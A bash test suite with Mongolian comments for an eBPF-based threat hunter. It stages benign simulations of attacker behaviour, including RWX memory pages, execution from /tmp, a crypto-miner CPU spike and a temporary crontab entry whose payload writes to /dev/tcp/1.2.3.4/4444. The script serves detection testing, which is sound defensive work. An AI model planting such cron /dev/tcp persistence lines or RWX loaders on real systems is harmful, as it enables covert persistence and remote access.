#!/bin/bash
# eBPF Hunter v4.0 — Quick Test
# Hunter ажиллаж байх үед өөр terminal-аас ажиллуулна
# sudo bash test_hunter.sh

echo "╔══════════════════════════════════════════════╗"
echo "║  eBPF Hunter v4.0  —  Quick Test Suite       ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "Hunter тусдаа terminal-д ажиллаж байгаа гэж үзнэ."
echo "Dashboard: http://localhost:8765"
echo ""

PASS=0
FAIL=0

run_test() {
    local name="$1"
    local cmd="$2"
    local wait="${3:-3}"
    echo "────────────────────────────────────────────"
    echo "🧪 $name"
    echo "   Команд: $cmd"
    eval "$cmd" 2>/dev/null &
    PID=$!
    sleep "$wait"
    kill "$PID" 2>/dev/null
    wait "$PID" 2>/dev/null
    echo "   ✓ Ажилуулагдлаа (hunter-ийн terminal дээр alert харагдах ёстой)"
    PASS=$((PASS+1))
    sleep 2
}

# ── TEST 1: RWX shellcode loader ─────────────────────────────────
cat > /tmp/hunter_test_loader.c << 'EOF'
#include <sys/mman.h>
#include <string.h>
int main(void) {
    char buf[64] = {0x90}; // NOP sled — harm хийхгүй
    void *m = mmap(NULL, sizeof(buf),
                   PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(m, buf, sizeof(buf));
    // call хийхгүй — зөвхөн RWX page үүсгэж detect хийлгэнэ
    munmap(m, sizeof(buf));
    return 0;
}
EOF
gcc /tmp/hunter_test_loader.c -o /tmp/hunter_test_rwx 2>/dev/null
run_test "T03: RWX mmap (shellcode loader simulation)" \
    "cp /tmp/hunter_test_rwx /tmp/custom_implant_test && /tmp/custom_implant_test" 2
rm -f /tmp/hunter_test_rwx /tmp/custom_implant_test /tmp/hunter_test_loader.c

# ── TEST 2: mprotect RW→RWX ──────────────────────────────────────
cat > /tmp/hunter_test_mprot.c << 'EOF'
#include <sys/mman.h>
#include <string.h>
int main(void) {
    char buf[64] = {0};
    void *m = mmap(NULL, sizeof(buf), PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    mprotect(m, sizeof(buf), PROT_READ|PROT_WRITE|PROT_EXEC);
    munmap(m, sizeof(buf));
    return 0;
}
EOF
gcc /tmp/hunter_test_mprot.c -o /tmp/hunter_test_mprot_bin 2>/dev/null
run_test "T05: mprotect RW→RWX (permission escalation)" \
    "cp /tmp/hunter_test_mprot_bin /tmp/mprot_test && /tmp/mprot_test" 2
rm -f /tmp/hunter_test_mprot.c /tmp/hunter_test_mprot_bin /tmp/mprot_test

# ── TEST 3: execve from /tmp ──────────────────────────────────────
cat > /tmp/xmrig_fake_test << 'EOF'
#!/bin/bash
sleep 1
echo "miner simulation"
EOF
chmod +x /tmp/xmrig_fake_test
run_test "T09: EXEC_TMP (execute from /tmp — crypto miner sim)" \
    "/tmp/xmrig_fake_test" 2
rm -f /tmp/xmrig_fake_test

# ── TEST 4: Crontab modification ─────────────────────────────────
echo "────────────────────────────────────────────"
echo "🧪 T10: CRON (crontab persistence simulation)"
echo "   Crontab-д /dev/tcp payload нэмж 3 секундын дараа арилгана..."
# Backup
crontab -l > /tmp/cron_bak_test 2>/dev/null
# Susp entry нэмэх
(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c "echo test > /dev/tcp/1.2.3.4/4444"') | crontab -
sleep 3
# Сэргээх
crontab /tmp/cron_bak_test 2>/dev/null || crontab -r 2>/dev/null
rm -f /tmp/cron_bak_test
echo "   ✓ Crontab сэргээгдлээ"
PASS=$((PASS+1))
sleep 2

# ── TEST 5: CPU spike ─────────────────────────────────────────────
echo "────────────────────────────────────────────"
echo "🧪 T09: CPU_SPIKE (crypto miner CPU simulation — 8 секунд)"
echo "   Бүх CPU core-г ачаалж байна..."
for i in $(seq 1 $(nproc)); do
    timeout 8 yes > /dev/null 2>&1 &
done
sleep 8
echo "   ✓ CPU load дууслаа"
PASS=$((PASS+1))
sleep 2

# ── TEST 6: Python RWX (ctypes injector sim) ─────────────────────
cat > /tmp/py_inject_test.py << 'EOF'
import ctypes, os
libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p
# Зөвхөн RWX page үүсгэж detect хийлгэнэ — shellcode ажиллуулахгүй
mem = libc.mmap(0, 64, 7, 0x22, -1, 0)
if mem and mem != -1:
    ctypes.string_at(mem, 1)  # read
    libc.munmap(mem, 64)
EOF
run_test "T07: PYTHON_INJECT (ctypes RWX mmap)" \
    "python3 /tmp/py_inject_test.py" 2
rm -f /tmp/py_inject_test.py

# ── SUMMARY ───────────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════════"
echo "  Тест дууслаа"
echo "  Ажиллуулсан: $((PASS+FAIL))   OK: $PASS   FAIL: $FAIL"
echo ""
echo "  Hunter-ийн terminal дээр alert-уудыг харна уу."
echo "  Dashboard: http://localhost:8765"
echo "════════════════════════════════════════════"
